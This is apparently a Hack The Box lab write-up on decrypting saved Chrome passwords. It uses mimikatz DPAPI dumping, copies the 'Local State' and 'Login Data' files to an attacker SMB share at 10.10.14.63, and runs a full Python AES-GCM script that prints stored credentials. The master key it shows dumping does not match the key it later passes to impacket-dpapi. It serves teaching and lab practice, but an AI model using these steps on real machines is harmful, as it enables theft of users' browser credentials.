
If an user is using Chrome and we found an interesting login entry, but the credentials are somehow encrypted we can use the following methodology to get credentials. Chrome uses AES-256 Encryption.

---
#### Chrome AES Encrypted Password

I tried to enumerate the chrome history further and was able to find smth interesting with mimikatz.

```
mimikatz # dpapi::chrome /in:"C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data"
URL     : https://zephyr.atlassian.htb/ ( https://zephyr.atlassian.htb/ )
Username: melissa
ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption
```

Dumped dpapi keys with mimikatz and found this interesting entry for user "marcus".

```
sekurlsa::dpapi
GUID      :  {97bd0c8e-87ad-468b-96bd-4799372dab18}
         * Time      :  02/08/2026 02:11:09
         * MasterKey :  3181bd14624fe4bfd59c6a98966e93bc323d94d84b38580dd2546f3c03fa4b3e762e9a16c009758d740652fde81d526bfd4b5833e5e508d16f47fa8d7e748c58
         * sha1(key) :  a74fe7458718840bd9ed0bd2d63dbe0bdc3a84e8
```

But this wasn't sufficient or enough. Since it's an Chrome Login Entry, the DPAPI encrypted key is in:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Local State
```

This is the JSON file that has the DPAPI protected encrypted key, which we'll need for decoding the actual AES encrypted password.

This password is stored in the SQLite DB File:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

1. We start with the downloading the DPAPI Key

On local machine:

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

On target machine:

```
net use m: \\10.10.14.63\test /user:saitama saitama
```

2. Navigated into path, so we can download the "Local State" File which

```
cd C:\Users\marcus\AppData\Local\Google\Chrome\User Data
```

3. Downloaded file to local machine.

```
copy "Local State" m:\
```

Ran the following script to extract the dpapi key out of the "Local State" file.

It does the following:

```
1. `json.load(open('Local State'))['os_crypt']['encrypted_key']`  
    → Grabs the Base64 string from the `Local State` file, e.g.  
    `"RFBBUEkBAAAA...."`
    
2. base64.b64decode(...)
    → Decodes it into bytes. The first bytes are always the ASCII string **`DPAPI`** (hex `44 50 41 50 49`).
    
3. `[5:]`  
    → Strips those 5 bytes (`DPAPI`). What remains is the pure DPAPI blob that `impacket-dpapi` needs.
```

4. Run this script to get "blob" file.

```
1. `python3 -c "import json,base64; open('blob','wb').write(base64.b64decode(json.load(open('Local State'))['os_crypt']['encrypted_key'])[5:])"`
```

It's now stored as an "blob" value, which represents the the raw encrypted DPAPI structure and it seems to be binary.

5. Let's now get the decrypted AES-256 key using impacket-dpapi.

```
impacket-dpapi unprotect -f blob -key 0x9a1d05826ba4996fff4247152075f389a38b0a97f07763dd4adaa99177b4e04cef644b33dc3e4fbc211b6d16d3b343ede06be50f3d89e82d2d5480567d2a8737
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Successfully decrypted data
 0000   F9 16 1E 38 0A 7F BF 9C  67 26 26 74 A2 B7 AC 6A   ...8....g&&t...j
 0010   E1 EE 72 62 13 DD 5A 3B  0F E6 E4 5D 34 95 59 96   ..rb..Z;...]4.Y.
```

6. We decrypted the AES Key and got it as hex value! Save this in an file. So it looks like this: 

```
F9161E380A7FBF9C67262674A2B7AC6AE1EE726213DD5A3B0FE6E45D34955996
```

7. Now we need to download the "Login Data" File in:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

This represents the SQLite Database in which the actual encrypted password is stored of chrome browser logins.

```
copy "Login Data" m:\
```

Utilized the following script in order to decrypt the password of user "melissa".

```
#!/usr/bin/env python3
import sqlite3, argparse, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_password(blob, key):
    if blob[:3] in (b'v10', b'v11'):
        nonce = blob[3:15]
        ciphertext = blob[15:-16]
        tag = blob[-16:]
    else:
        return "[Unknown format]"
    try:
        return AESGCM(key).decrypt(nonce, ciphertext + tag, None).decode()
    except:
        return "[Decryption error]"

def main():
    parser = argparse.ArgumentParser(description='Decrypt Chrome passwords using an AES key.')
    parser.add_argument('login_data', help='Path to Login Data file')
    parser.add_argument('key', help='64‑char hex AES key (from DPAPI unprotect)')
    parser.add_argument('--output', '-o', help='Output file (CSV)')
    args = parser.parse_args()

    key = bytes.fromhex(args.key)
    conn = sqlite3.connect(args.login_data)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")

    rows = []
    for url, user, pwd in cur.fetchall():
        pw = decrypt_password(pwd, key)
        rows.append((url, user, pw))
        print(f"[*] {url} | {user} : {pw}")

    conn.close()

    if args.output:
        with open(args.output, 'w') as f:
            for r in rows:
                f.write(f'"{r[0]}","{r[1]}","{r[2]}"\n')
        print(f"[+] Saved to {args.output}")

if __name__ == "__main__":
    main()

```

8. Ran the command with the SQLite Database file and the decrypted DPAPI Key.

```
python3 decrypt2.py "Login Data" F9161E380A7FBF9C67262674A2B7AC6AE1EE726213DD5A3B0FE6E45D34955996
[*] https://zephyr.atlassian.htb/ | melissa : WinterIsHere2022!
```
